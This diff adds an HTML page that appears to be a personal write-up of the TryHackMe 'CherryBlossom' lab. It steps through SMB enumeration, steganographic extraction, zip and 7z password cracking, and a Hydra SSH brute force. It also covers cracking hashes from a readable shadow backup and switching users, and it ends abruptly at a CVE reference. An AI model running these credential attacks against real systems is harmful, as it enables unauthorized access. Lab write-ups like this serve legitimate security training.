@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CherryBlossom | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-CherryBlossom</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">CherryBlossom</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack ttl 62
+139/tcp open  netbios-ssn  syn-ack ttl 62
+445/tcp open  microsoft-ds syn-ack ttl 62
+
+Host script results:
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
+|   account_used: &lt;blank&gt;
+|   \\10.64.149.126\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+</code></pre>
+
+<pre class="codehilite"><code>smbclient //10.64.149.126/Anonymous -N -t 900
+
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Feb  9 19:22:51 2020
+  ..                                  D        0  Sun Feb  9 12:48:18 2020
+  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
+ge
+                10253588 blocks of size 1024. 4671704 blocks available
+smb: \&gt; get journal.txt
+getting file \journal.txt of size 3470998 as journal.txt (10.3 KiloBytes/sec) (average 10.3 KiloBytes/sec)
+</code></pre>
+
+<pre class="codehilite"><code>cat journal.txt | base64 -d &gt; output
+
+file output
+output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
+</code></pre>
+
+<pre class="codehilite"><code>stegpy output         
+File _journal.zip succesfully extracted from output
+
+unzip _journal.zip
+Archive:  _journal.zip
+file #1:  bad zipfile offset (local header sig):  0
+
+file _journal.zip
+_journal.zip: JPEG image data
+
+
+ls
+journal.txt  _journal.zip  output
+
+fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal.zip
+found id d8ffd8ff, '_journal.zip' is not a zipfile ver 2.xx, skipping
+no usable files found
+</code></pre>
+
+<p>it thinks it’s a JPEG…<br />
+Open it up in <code>hexeditor</code> and we’ll check to see if it’s had its magic number tampered with:</p>
+<p>Well, considering that the magic number for a standard <code>.zip</code> zipfile is <code>50 4B 03 04</code>, I have a feeling we might be right on the money with this one.</p>
+<p><code>file _journal.zip                                            
+_journal.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Feb 10 2020 00:01:42, uncompressed size 70434, method=deflate</code></p>
+<pre class="codehilite"><code>fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
+PASSWORD FOUND!!!!: pw == september
+</code></pre>
+
+<pre class="codehilite"><code>/usr/share/john/7z2john.pl Journal.ctz &gt; hash.txt
+ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
+</code></pre>
+
+<pre class="codehilite"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tigerlily        (Journal.ctz)     
+1g 0:00:01:55 DONE (2025-12-24 12:47) 0.008660g/s 48.49p/s 48.49c/s . 
+</code></pre>
+
+<pre class="codehilite"><code>└─$ 7z e Journal.ctz
+
+7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 70434 bytes (69 KiB)
+
+Extracting archive: Journal.ctz
+--
+Path = Journal.ctz
+Type = 7z
+Physical Size = 70434
+Headers Size = 146
+Method = LZMA2:16 7zAES
+Solid = -
+Blocks = 1
+
+
+Enter password (will not be echoed):
+Everything is Ok
+
+Size:       158136
+Compressed: 70434
+</code></pre>
+
+<p>now can open <code>Journal.ctd</code> and find more info and can find user and can be found some wordlists that user used to create pwds</p>
+<p>so i decode all and make all that wordlists and use into  bruteforce user ssh</p>
+<pre class="codehilite"><code>└─$ hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-24 13:18:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://10.64.149.126:22/
+[22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-24 13:18:50
+</code></pre>
+
+<pre class="codehilite"><code>[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root shadow 771 Feb  9  2020 /var/backups/gshadow.bak
+-r--r--r-- 1 root shadow 1481 Feb  9  2020 /var/backups/shadow.bak
+-rw------- 1 root root 936 Feb  9  2020 /var/backups/group.bak
+-rw------- 1 root root 2382 Feb  9  2020 /var/backups/passwd.bak
+</code></pre>
+
+<pre class="codehilite"><code>/var/backups/shadow.bak
+</code></pre>
+
+<pre class="codehilite"><code>johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
+lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
+sshd:*:18301:0:99999:7:::
+</code></pre>
+
+<pre class="codehilite"><code>john --wordlist=cherry-blossom.txt hashes.txt
+
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Mr.$un$hin3      (lily)     
+##scuffleboo##   (johan)     
+2g 0:00:00:03 DONE (2025-12-24 13:42) 0.5988g/s 2146p/s 2299c/s 2299C/s #shauna#..#imab#3899261#
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<pre class="codehilite"><code>lily@cherryblossom:~$ su johan
+Password: 
+
+johan@cherryblossom:~$ ls -la
+total 48
+
+-rw-rw-r--  1 johan johan   38 Feb 10  2020 user.txt
+-rw-rw-r--  1 johan johan  180 Feb  9  2020 .wget-hsts
+johan@cherryblossom:~$ cat user.txt
+</code></pre>
+
+<p><code>CVE-2019-18364</code></p>
+<pre class="codehilite"><code>root/root.txt
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
